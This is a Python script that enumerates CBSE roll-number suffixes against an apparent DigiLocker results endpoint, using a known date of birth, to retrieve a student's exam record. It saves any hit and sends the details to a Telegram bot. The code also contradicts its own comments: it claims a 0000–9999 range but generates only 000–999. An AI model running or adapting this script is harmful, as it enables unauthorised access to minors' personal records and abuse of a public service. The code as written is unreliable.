import requests
import time
import random
import os
import json

def send_telegram_message(bot_token, chat_id, message):
    """Send a message to Telegram chat"""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        response = requests.post(url, json={"chat_id": chat_id, "text": message}, timeout=5)
        return response.ok
    except Exception as e:
        print(f"Failed to send Telegram message: {e}")
        return False

def try_roll_numbers(prefix="26102", dob="11/05/2010", year="2026", 
                     doctype="SSCER", delay=0.5, start_from=000, random_order=False,
                     telegram_bot_token=None, telegram_chat_id=None):
    """
    Try roll number suffixes from 0000 to 9999.
    prefix + 4-digit suffix = full roll number.
    """
    url = "https://results.digilocker.gov.in/api/cbse/sscer/results"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }

    # Generate all 4-digit suffixes from 0000 to 9999
    all_suffixes = [f"{s:03d}" for s in range(1000)]  # 0000, 0001, ..., 9999

    if random_order:
        random.shuffle(all_suffixes)
        print("Trying suffixes in random order (10,000 combinations).")
    elif start_from is not None:
        if 0 <= start_from <= 999:
            start_idx = start_from
            all_suffixes = all_suffixes[start_idx:] + all_suffixes[:start_idx]
            print(f"Starting from suffix {start_idx:04d} and continuing sequentially.")
        else:
            print(f"Invalid start_from {start_from}, must be 0-9999. Starting from 0000.")
    else:
        print("Starting from 0000 sequentially.")

    for suffix in all_suffixes:
        roll_number = prefix + suffix
        payload = {
            "rroll": roll_number,
            "doctype": doctype,
            "dob": dob,
            "year": year
        }

        print(f"Trying roll number: {roll_number}")

        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            try:
                data = response.json()
            except:
                data = {}

            if response.status_code == 200:
                # Check for success indicators (customize if needed)
                data_str = json.dumps(data).lower()
                if (isinstance(data, dict) and 
                    (data.get("statusCode") == "SUCCESS" or 
                     "result" in data or 
                     "marks" in data_str or
                     "name" in data_str)):
                    print(f"\n*** SUCCESS! Valid roll number: {roll_number} ***")
                    print("Response:", json.dumps(data, indent=2)[:500])
                    
                    # Save locally
                    with open("valid_result.json", "w", encoding="utf-8") as f:
                        json.dump(data, f, indent=2)
                    
                    # Send Telegram notification
                    if telegram_bot_token and telegram_chat_id:
                        msg = (f"✅ CBSE Result Found!\n"
                               f"Roll Number: {roll_number}\n"
                               f"DOB: {dob}\n"
                               f"Year: {year}\n"
                               f"Full response saved in valid_result.json")
                        send_telegram_message(telegram_bot_token, telegram_chat_id, msg)
                        print("Telegram notification sent.")
                    else:
                        print("Telegram credentials missing, skipping notification.")
                    
                    return roll_number, data
                else:
                    # Normal "not found" response
                    error_indicators = ["not found", "invalid", "error", "no record"]
                    if any(ind in data_str for ind in error_indicators):
                        print(f"  -> No result")
                    else:
                        print(f"  -> Probably no result")
            else:
                print(f"  -> HTTP {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"  -> Request failed: {e}")

        time.sleep(delay)

    print("No valid roll number found in range 0000-9999.")
    return None, None

if __name__ == "__main__":
    # ========== CONFIGURATION ==========
    PREFIX = "26102"            # Fixed prefix (4 digits)
    DOB = "29/10/2010"
    YEAR = "2026"
    DOCTYPE = "SSCER"
    DELAY = 0.5                # Seconds between requests
    START_FROM = None          # e.g., 5000, or None to start from 0000
    RANDOM_ORDER = False       # Set True to randomise order

    # ========== TELEGRAM SECRETS ==========
    # Read from environment variables (Replit/Streamlit/GitHub secrets)
    TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
    TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
    
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ WARNING: Telegram credentials not found in environment variables.")
        print("   No notifications will be sent. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.")
    else:
        print("✅ Telegram credentials loaded.")
    
    # Run the search
    roll, response_data = try_roll_numbers(
        prefix=PREFIX,
        dob=DOB,
        year=YEAR,
        doctype=DOCTYPE,
        delay=DELAY,
        start_from=START_FROM,
        random_order=RANDOM_ORDER,
        telegram_bot_token=TELEGRAM_BOT_TOKEN,
        telegram_chat_id=TELEGRAM_CHAT_ID
    )
    
    if roll:
        print(f"\n🎉 Success! Roll number: {roll}")
    else:
        print("\n❌ No match found in 10,000 attempts.")
